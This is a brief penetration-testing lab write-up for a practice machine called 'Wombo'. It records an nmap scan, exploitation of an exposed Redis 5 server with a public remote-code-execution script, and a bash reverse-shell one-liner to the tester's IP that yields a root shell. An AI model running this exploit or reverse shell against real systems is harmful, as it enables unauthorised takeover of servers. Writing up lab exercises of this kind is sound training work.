---
icon: ubuntu
---

# Wombo - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.69 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 17:00 EDT
Nmap scan report for 192.168.231.69
Host is up (0.030s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
|_http-title: Home | NodeBB
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
```

### <mark style="color:$primary;">Redis 5.X RCE</mark>

This is a very known vulnerability and there are a lot of exploit scripts available on [**Github**](https://github.com/jas502n/Redis-RCE), I went ahead and used this [**one**](https://github.com/jas502n/Redis-RCE)

Before running the exploit make sure to run it from the location where exp.so is located, otherwise it will not work. Since the exploit will be setting up a http server for exp.so to be downloaded by the target machine.

```
git clone https://github.com/jas502n/Redis-RCE.git
```

```
python3 redis-rce.py -r 192.168.231.69 -p 6379 -L 192.168.45.158 -P 80 -v -f exp_lin.so
```

<figure><img src="../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

Surprisingly this is being run by root. At the end I used a simple bash script to get a proper shell as root

```
bash -c 'bash -i >& /dev/tcp/192.168.45.158/80 0>&1'
```
